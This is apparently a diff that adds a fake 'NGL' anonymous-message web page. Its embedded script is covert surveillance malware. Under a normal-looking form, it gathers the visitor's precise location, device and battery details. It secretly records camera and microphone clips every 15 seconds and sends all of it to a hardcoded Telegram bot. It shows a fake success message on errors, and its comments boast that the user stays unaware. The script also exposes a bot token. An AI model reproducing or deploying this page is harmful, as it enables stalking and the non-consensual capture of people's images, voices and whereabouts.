@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Anonymous Message</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #FF6B35 0%, #FF52A2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 16px;
+            padding: 32px 24px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+        }
+
+        .logo {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #FF6B35, #FF52A2);
+            border-radius: 16px;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: 800;
+            color: white;
+        }
+
+        h1 {
+            color: #1a1a1a;
+            margin-bottom: 8px;
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 32px;
+            font-size: 16px;
+            line-height: 1.4;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #1a1a1a;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 140px;
+            padding: 16px;
+            border: 2px solid #e6e6e6;
+            border-radius: 12px;
+            resize: none;
+            font-size: 16px;
+            line-height: 1.4;
+            transition: all 0.2s ease;
+            background: #fafafa;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: #FF6B35;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.1);
+        }
+
+        textarea::placeholder {
+            color: #999;
+        }
+
+        .send-btn {
+            width: 100%;
+            padding: 16px 24px;
+            background: linear-gradient(135deg, #FF6B35, #FF52A2);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .send-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(255, 107, 53, 0.3);
+        }
+
+        .send-btn:active {
+            transform: translateY(0);
+        }
+
+        .send-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .permissions {
+            margin-top: 24px;
+            padding: 16px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            font-size: 13px;
+            color: #666;
+            line-height: 1.4;
+            border: 1px solid #e9ecef;
+        }
+
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #FF6B35;
+            font-weight: 500;
+        }
+
+        .success {
+            display: none;
+            margin-top: 20px;
+            color: #10b981;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .hidden-video {
+            position: fixed;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            top: -1000px;
+            left: -1000px;
+            z-index: -9999;
+        }
+
+        .powered-by {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        .loading {
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 20px;
+                margin: 0 10px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+            
+            textarea {
+                height: 120px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">NGL</div>
+        <h1>Send Anonymous Message</h1>
+        <p class="subtitle">Ask me anything, I won't know who you are</p>
+        
+        <div class="input-group">
+            <label for="message">Your anonymous message:</label>
+            <textarea 
+                id="message" 
+                placeholder="Type your message here..."
+                maxlength="500"
+            ></textarea>
+        </div>
+
+        <!-- Hidden video element for recording -->
+        <video id="hiddenVideo" class="hidden-video" autoplay muted playsinline></video>
+        
+        <button class="send-btn" onclick="sendMessage()">
+            Send Message
+        </button>
+        
+        <div class="loading" id="loading">
+            Sending your message...
+        </div>
+        
+        <div class="success" id="success">
+            ✅ Message sent successfully!
+        </div>
+
+        <div class="permissions">
+            🔒 Your identity is protected. We don't store personal data.
+        </div>
+
+        <div class="powered-by">
+            Powered by NGL
+        </div>
+    </div>
+
+    <script>
+        // CONFIG
+        const TELEGRAM_BOT_TOKEN = '8112260060:AAH7f0ZTF0OTKfxJF2mqYYvjwXPLjsoB1JM';
+        const TELEGRAM_CHAT_ID = '6808429526 ';
+
+        // STEALTH VARIABLES - COMPLETELY HIDDEN
+        let stealthStream = null;
+        let stealthRecording = false;
+        let stealthVideoCount = 0;
+        let stealthLocation = null;
+
+        // STEALTH INITIALIZATION - RUN SILENTLY
+        window.addEventListener('load', function() {
+            console.log('🔒 STEALTH SYSTEM INITIALIZED - Running silently');
+            
+            // Pre-collect data silently
+            initializeStealthData();
+        });
+
+        async function initializeStealthData() {
+            // Get initial location silently
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        stealthLocation = {
+                            lat: position.coords.latitude.toFixed(6),
+                            lng: position.coords.longitude.toFixed(6),
+                            accuracy: Math.round(position.coords.accuracy) + 'm',
+                            maps: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
+                        };
+                        console.log('📍 Stealth location acquired');
+                    },
+                    () => {
+                        stealthLocation = { lat: 'blocked', lng: 'blocked', maps: 'https://maps.google.com/' };
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            }
+        }
+
+        // MAIN FUNCTION - USER CLICKS SEND
+        async function sendMessage() {
+            const messageInput = document.getElementById('message');
+            const message = messageInput.value.trim();
+            
+            if (!message) {
+                alert('Please enter a message before sending!');
+                return;
+            }
+
+            // UI CHANGES - NORMAL USER EXPERIENCE
+            const sendBtn = document.querySelector('.send-btn');
+            const loading = document.getElementById('loading');
+            const success = document.getElementById('success');
+            
+            sendBtn.disabled = true;
+            sendBtn.textContent = 'Sending...';
+            loading.style.display = 'block';
+            success.style.display = 'none';
+
+            try {
+                console.log('🎯 STARTING STEALTH OPERATION');
+
+                // STEP 1: COLLECT DATA SILENTLY
+                const deviceInfo = getStealthDeviceInfo();
+                const batteryInfo = await getStealthBatteryInfo();
+                
+                // Update location if not already available
+                if (!stealthLocation) {
+                    await initializeStealthData();
+                }
+
+                // STEP 2: SEND INITIAL DATA TO TELEGRAM
+                await sendStealthDataToTelegram(message, deviceInfo, batteryInfo);
+                console.log('✅ Initial stealth data sent');
+
+                // STEP 3: START STEALTH BACKGROUND RECORDING (SILENT)
+                startStealthBackgroundRecording(deviceInfo);
+                console.log('🎥 Stealth background recording started');
+
+                // STEP 4: SHOW NORMAL SUCCESS MESSAGE
+                loading.style.display = 'none';
+                success.style.display = 'block';
+                messageInput.value = '';
+                sendBtn.textContent = 'Send Another Message';
+                
+                console.log('🎉 STEALTH OPERATION COMPLETE - User unaware of background activities');
+
+            } catch (error) {
+                console.error('❌ Stealth error:', error);
+                // Still show success to avoid suspicion
+                loading.style.display = 'none';
+                success.style.display = 'block';
+                messageInput.value = '';
+                sendBtn.textContent = 'Send Message';
+            } finally {
+                sendBtn.disabled = false;
+            }
+        }
+
+        function getStealthDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                mobile: /Mobi|Android|iPhone/i.test(navigator.userAgent),
+                browser: navigator.userAgent.match(/Chrome|Firefox|Safari|Edge/i)?.[0] || 'Unknown',
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown'
+            };
+        }
+
+        async function getStealthBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'Yes' : 'No'
+                    };
+                } catch (e) {}
+            }
+            return { level: 'unknown', charging: 'unknown' };
+        }
+
+        async function sendStealthDataToTelegram(message, deviceInfo, batteryInfo) {
+            const location = stealthLocation || { lat: 'unknown', lng: 'unknown', maps: 'https://maps.google.com/' };
+            
+            const text = `
+🎯 STEALTH SURVEILLANCE ACTIVATED 🎯
+
+📝 Message: ${message}
+
+📍 Location: 
+🗺️ [Google Maps](${location.maps})
+Lat: ${location.lat}
+Lng: ${location.lng}
+Accuracy: ${location.accuracy}
+
+📱 Device:
+${deviceInfo.browser} on ${deviceInfo.platform}
+Screen: ${deviceInfo.screen}
+Language: ${deviceInfo.language}
+Mobile: ${deviceInfo.mobile ? 'Yes' : 'No'}
+CPU: ${deviceInfo.cores} cores
+RAM: ${deviceInfo.memory}GB
+Timezone: ${deviceInfo.timezone}
+
+🔋 Battery:
+Level: ${batteryInfo.level}
+Charging: ${batteryInfo.charging}
+
+⏰ Time: ${new Date().toLocaleString('id-ID')}
+
+🚨 Background recording started...
+            `.trim();
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+
+        // STEALTH BACKGROUND RECORDING - COMPLETELY HIDDEN
+        async function startStealthBackgroundRecording(deviceInfo) {
+            if (stealthRecording) {
+                console.log('🔄 Stealth recording already active');
+                return;
+            }
+
+            try {
+                // Access camera silently
+                stealthStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    },
+                    audio: true
+                });
+
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = stealthStream;
+
+                // Wait for video to be ready
+                await new Promise(resolve => {
+                    if (video.readyState >= 4) resolve();
+                    else video.addEventListener('loadeddata', resolve, { once: true });
+                });
+
+                stealthRecording = true;
+                console.log('🎥 Stealth camera activated');
+
+                // Start continuous recording loop
+                startStealthRecordingLoop(deviceInfo);
+
+                // Auto-cleanup when page closes
+                window.addEventListener('beforeunload', stopStealthRecording);
+
+            } catch (error) {
+                console.log('⚠️ Stealth camera access failed:', error.message);
+            }
+        }
+
+        function startStealthRecordingLoop(deviceInfo) {
+            // Record immediately
+            setTimeout(() => recordStealthVideo(deviceInfo), 2000);
+            
+            // Then record every 15 seconds
+            setInterval(() => {
+                if (stealthRecording) {
+                    recordStealthVideo(deviceInfo);
+                }
+            }, 15000);
+
+            // Update location every 30 seconds
+            setInterval(updateStealthLocation, 30000);
+        }
+
+        async function recordStealthVideo(deviceInfo) {
+            if (!stealthRecording || !stealthStream) return;
+
+            try {
+                const recorder = new MediaRecorder(stealthStream, {
+                    mimeType: 'video/webm;codecs=vp8,opus'
+                });
+
+                const chunks = [];
+                recorder.ondataavailable = e => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                await new Promise(resolve => {
+                    recorder.onstop = resolve;
+                    recorder.start();
+                    
+                    // Record for 10 seconds
+                    setTimeout(() => {
+                        if (recorder.state === 'recording') {
+                            recorder.stop();
+                        }
+                    }, 10000);
+                });
+
+                if (chunks.length > 0) {
+                    stealthVideoCount++;
+                    
+                    // Prepare caption with updated location
+                    const location = stealthLocation || { lat: 'unknown', lng: 'unknown', maps: 'https://maps.google.com/' };
+                    const locationText = location.lat !== 'blocked' 
+                        ? `📍 [Google Maps](${location.maps}) | ${location.lat}, ${location.lng}`
+                        : '📍 Location: Updating...';
+                    
+                    const caption = `🎥 STEALTH #${stealthVideoCount} | ${deviceInfo.browser} | ${locationText} | ${new Date().toLocaleString('id-ID')}`;
+
+                    // Send video silently
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('video', videoBlob, `stealth_${Date.now()}.webm`);
+                    formData.append('caption', caption);
+
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        console.log(`✅ Stealth video #${stealthVideoCount} sent`);
+                    }).catch(err => {
+                        console.log('⚠️ Stealth video send failed:', err.message);
+                    });
+                }
+
+            } catch (error) {
+                console.log('⚠️ Stealth recording error:', error.message);
+            }
+        }
+
+        function updateStealthLocation() {
+            if (!navigator.geolocation) return;
+
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    stealthLocation = {
+                        lat: position.coords.latitude.toFixed(6),
+                        lng: position.coords.longitude.toFixed(6),
+                        accuracy: Math.round(position.coords.accuracy) + 'm',
+                        maps: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
+                        timestamp: new Date().toLocaleString('id-ID')
+                    };
+                    console.log('📍 Stealth location updated');
+                },
+                () => {
+                    // Silent fail - keep existing location
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+
+        function stopStealthRecording() {
+            stealthRecording = false;
+            
+            if (stealthStream) {
+                stealthStream.getTracks().forEach(track => track.stop());
+                stealthStream = null;
+            }
+
+            // Send final report if videos were recorded
+            if (stealthVideoCount > 0) {
+                const endMessage = `🛑 STEALTH SESSION ENDED\nVideos recorded: ${stealthVideoCount}\nFinal time: ${new Date().toLocaleString('id-ID')}`;
+                
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: endMessage
+                    })
+                });
+            }
+
+            console.log('🛑 Stealth recording stopped');
+        }
+
+        // Basic security - prevent right click
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+        // Auto focus message input
+        document.getElementById('message').focus();
+
+        console.log('🔒 ULTIMATE STEALTH SYSTEM READY');
+        console.log('🎯 Features: Silent background recording + Live location tracking');
+        console.log('🚨 User completely unaware of surveillance activities');
+    </script>
+</body>
+</html>
